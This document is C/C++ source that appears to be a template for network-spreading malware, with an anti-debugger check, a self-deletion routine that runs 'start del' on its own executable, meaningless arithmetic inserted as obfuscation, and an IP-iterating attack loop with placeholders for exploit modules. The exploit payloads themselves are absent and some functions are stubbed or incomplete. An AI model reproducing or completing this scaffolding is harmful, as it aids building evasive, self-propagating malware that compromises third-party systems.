#include "test4.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName = "";

int main(int argc, char** argv) {

	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);

	//
	adbg_CheckRemoteDebuggerPresent();
	//[ninjaModule]
	if (argc == 0) {/*normal process*/
	//[moduleThreads]

	//[mainExploit]	

	}
	//[optionElseIf]
	else {
		SelfDelete();
		return 0;
	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}

void SelfDelete() {
	char out[MAX_PATH];
	GetModuleFileNameA(NULL, (LPSTR)out, 100);
	int il5HJIPMUVr = 0xc1f3b50;
	int iqdavECMvYC = 0x25377d7;
	int if794gYDqjA = 0x87408a5;
	int iVkIMR4gRwv = il5HJIPMUVr + iqdavECMvYC - if794gYDqjA;
	iVkIMR4gRwv = 0x41043e0 * iVkIMR4gRwv + 0x7c31da4 - iqdavECMvYC;
	int ieSIp8G2lwH = iVkIMR4gRwv / 0x7c31da4 + il5HJIPMUVr ^ if794gYDqjA - 0x87408a5;

	char str[MAX_PATH];
	strcpy(str, "start del ");
	strcat(str, out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	int imhMzT5Zgb4 = 0x5d26ffb;
	int ibomtHEn7So = 0xfd1c289;
	int iCi8gxT2voH = imhMzT5Zgb4 * ibomtHEn7So;

	CHAR   a;
	int ignJyUAbyxX = 0x5d1874e;
	int iNHkgieQaYJ = 0xdd63f45;
	int ixJ3PwnOjVb = 0xfdc7dde;
	int iScb00jAC1M = ixJ3PwnOjVb * iNHkgieQaYJ + ignJyUAbyxX;
	iNHkgieQaYJ = 0x47fe7d8 - iScb00jAC1M + 5 + 0x9a34a9a + 69 - ignJyUAbyxX;
	ignJyUAbyxX = 0x5d1874e + 10 - iNHkgieQaYJ % 10 + 0xfdc7dde + 999 - iScb00jAC1M;
	iScb00jAC1M = ignJyUAbyxX % 5 + ixJ3PwnOjVb % 0xdd63f45 + 0xcafebabe + ignJyUAbyxX;
	ixJ3PwnOjVb = 0x5d1874e * 0x100 - ignJyUAbyxX + 56 ^ 0xdd63f45 + 1996 - ixJ3PwnOjVb;
	int izHPLc5ZhFX = ixJ3PwnOjVb / 77 + 0xfdc7dde - 76 / ixJ3PwnOjVb ^ 0x33 % ixJ3PwnOjVb % 0xfdc7dde;
	izHPLc5ZhFX = 0x9a34a9a * 0x10 - 22 + izHPLc5ZhFX + 56 ^ 0xff + iNHkgieQaYJ + 1996 - 2111 + ixJ3PwnOjVb;

	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;
	int izG9KZ7o3Hs = 0xf58a568;
	int iQq1H2yTQvZ = 0x1fb5454;
	int icBHLcFYf7o = 0x91d2df4;
	int itR7MIYOXwW = 0x8567d51;
	int iBAkEkhzVFk = 1;
	switch (iBAkEkhzVFk)
	{
	case 0:
		izG9KZ7o3Hs = iQq1H2yTQvZ - 0x900af61 * icBHLcFYf7o / 100;
		iQq1H2yTQvZ = 0x91d2df4 - 5 + 0x91d2df4 - 6 * iQq1H2yTQvZ / 10 + 25;
		icBHLcFYf7o = izG9KZ7o3Hs * 0x12 + itR7MIYOXwW * 0x15 + 0x8567d51 / 13 + 0x900af61 + 555;
		itR7MIYOXwW = 0xf58a568 - 21 + 11 * 1996 - iQq1H2yTQvZ + 14520538 - icBHLcFYf7o - 14520692 + 0x1fb5454 - 97;
		break;
	case 1:
		izG9KZ7o3Hs = iQq1H2yTQvZ - 25 + 0xf58a568 - 40 + 0x91d2df4 % 10 + 2;
		icBHLcFYf7o = icBHLcFYf7o - 0xff % 3 - itR7MIYOXwW * 10 + 0x900af61 / 2 - 10 + 0x1fb5454 - 5;
		itR7MIYOXwW = 0xf58a568 % 0x900af61 ^ 33 + 0x91d2df4 * 0x12 - 30 + 0x91d2df4 + 23;
		iQq1H2yTQvZ = iQq1H2yTQvZ + 321 + icBHLcFYf7o * 10 * iQq1H2yTQvZ / 10 / 2 + 0x900af61 * 0x60;
		break;
	case 2:
		izG9KZ7o3Hs = iQq1H2yTQvZ - 45 - icBHLcFYf7o * 46 + 0xf58a568 / 0xdade;
		iQq1H2yTQvZ = iQq1H2yTQvZ + 0x900af61 - icBHLcFYf7o * 0x1fb5454 - 3;
		icBHLcFYf7o = 0x1fb5454 - 0x1 + izG9KZ7o3Hs * 0x2 - 0x900af61 / 0x3 + 0x91d2df4;
		itR7MIYOXwW = izG9KZ7o3Hs - 0x4 * 0xf58a568 + 0x1234 - 0x4567 + 0xcafe + iQq1H2yTQvZ % 0x432 / 0x8567d51 - 0x23;
		break;
	case 3:
		iQq1H2yTQvZ = itR7MIYOXwW * 2 * 0x1fb5454 - 4 + 0x900af61 + 12 + 34 + 0xf58a568;
		icBHLcFYf7o = iQq1H2yTQvZ - 43 + 0x91d2df4 * 3040 - 0x1fb5454 % 10 + 1 - 0x91d2df4;
		itR7MIYOXwW = 0x91d2df4 - 33 + izG9KZ7o3Hs * 0x25 + 0xf58a568 - 3004 + 0x1fb5454;
		izG9KZ7o3Hs = 0xf58a568 + 2905 % iQq1H2yTQvZ * 1996 + 0x8567d51 - 70 * 0x900af61;
		break;
	case 4:
		itR7MIYOXwW = iQq1H2yTQvZ - 36 + 0x900af61 * 2001 - icBHLcFYf7o / 234 + 0x7;
		izG9KZ7o3Hs = itR7MIYOXwW - 0xabcedf + 0x1fb5454 * 0xa2bc5 + itR7MIYOXwW / 0x123 + 0xf58a568;
		icBHLcFYf7o = izG9KZ7o3Hs - 0x124 + 23 / iQq1H2yTQvZ / 3 / 2 + icBHLcFYf7o + 29 - 0x1fb5454 + 100;
		iQq1H2yTQvZ = 0x1fb5454 - 70 + 70 + 0xf58a568 / 2 + 423 - 0xf58a568 / 7749 % 0x1234;
		break;
	case 5:
		iQq1H2yTQvZ = iQq1H2yTQvZ - 9981 % izG9KZ7o3Hs + 111 - icBHLcFYf7o / 224 % 0x91d2df4;
		icBHLcFYf7o = icBHLcFYf7o - 339 - icBHLcFYf7o * 4416 / 0x900af61 + 5525 + 0x1fb5454 % 10;
		itR7MIYOXwW = itR7MIYOXwW - 6636 + 0x1fb5454 * 7749 + 1 - iQq1H2yTQvZ * 8864 / 0xfecba;
		izG9KZ7o3Hs = 0x900af61 - 9981 % 0xf58a568 % 10 % 1010100 - 0xf58a568 - 23 - 0x900af61 - 2500;
		break;
	}
	iBAkEkhzVFk = itR7MIYOXwW - 0xaa + 0x91d2df4 * 46 - 15 / icBHLcFYf7o + 11 - 0xf58a568;
	iBAkEkhzVFk = iBAkEkhzVFk - 70 * 55 - icBHLcFYf7o ^ 0x99 - 0x567498 % 0xf58a568 % 2 - 234 + 0x1fb5454;


	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
void initAttack(int ipAddress[]) {

	register int i, j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
	DWORD   dwThreadIdArray[MAX_THREADS];
	HANDLE  hThreadArray[MAX_THREADS];
	int curIP[4];

	//[exploitThreads]

	//Increase IP when all exploit done
	ipAddress[0] = curIP[0];
	ipAddress[1] = curIP[1];
	ipAddress[2] = curIP[2];
	int isUth42c8kp = 0x4881156;
	int iLSRj5ksW3e = 0xc2cacbd;
	int idWM3hAwy9M = 0xeb78eb3;
	int i19nVjvFYWL = idWM3hAwy9M * iLSRj5ksW3e + isUth42c8kp;
	iLSRj5ksW3e = 0xf29cc18 - i19nVjvFYWL + 5 + 0xd25285a + 69 - isUth42c8kp;
	isUth42c8kp = 0x4881156 + 10 - iLSRj5ksW3e % 10 + 0xeb78eb3 + 999 - i19nVjvFYWL;
	i19nVjvFYWL = isUth42c8kp % 5 + idWM3hAwy9M % 0xc2cacbd + 0xcafebabe + isUth42c8kp;
	idWM3hAwy9M = 0x4881156 * 0x100 - isUth42c8kp + 56 ^ 0xc2cacbd + 1996 - idWM3hAwy9M;
	int iIN8CXlabb6 = idWM3hAwy9M / 77 + 0xeb78eb3 - 76 / idWM3hAwy9M ^ 0x33 % idWM3hAwy9M % 0xeb78eb3;
	iIN8CXlabb6 = 0xd25285a * 0x10 - 22 + iIN8CXlabb6 + 56 ^ 0xff + iLSRj5ksW3e + 1996 - 2111 + idWM3hAwy9M;

	ipAddress[3] = curIP[3];
}

//[exploit_function]

void ipAr2Str(int ipAddress[], char* result) {
	int tmp[4];
	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i", ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
